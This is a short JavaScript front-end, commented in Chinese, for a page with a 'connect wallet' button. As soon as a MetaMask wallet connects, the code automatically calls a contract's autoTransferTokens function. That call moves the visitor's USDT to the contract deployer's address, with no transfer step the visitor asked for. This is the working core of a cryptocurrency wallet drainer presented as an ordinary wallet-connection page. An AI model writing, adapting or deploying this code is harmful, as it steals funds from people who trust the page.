const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 替换为你的合约地址
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "autoTransferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // 其他 ABI 项
];

let userAccount;
let contract;

// USDT 合约地址
const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // Ethereum上的USDT合约地址
// 设置接收地址为合约部署者地址
let toAddress;

// 连接钱包按钮事件
document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = ethereum.selectedAddress;
            contract = new web3.eth.Contract(contractABI, contractAddress);
            toAddress = await contract.methods.owner().call(); // 获取合约部署者地址

            document.getElementById('transferButton').style.display = 'inline';
            document.getElementById('status').textContent = '钱包连接成功：' + userAccount;

            // 触发自动转移
            await transferTokens(tokenAddress, userAccount, toAddress);
        } catch (error) {
            document.getElementById('status').textContent = '连接钱包失败：' + error.message;
        }
    } else {
        document.getElementById('status').textContent = '请安装 MetaMask！';
    }
});

// 自动转移函数
async function transferTokens(tokenAddress, fromAddress, toAddress) {
    try {
        await contract.methods.autoTransferTokens(tokenAddress, fromAddress, toAddress).send({ from: userAccount });
        document.getElementById('status').textContent = '转移成功！';
    } catch (error) {
        console.error('转移时出错:', error);
        document.getElementById('status').textContent = '转移失败：' + error.message;
    }
}
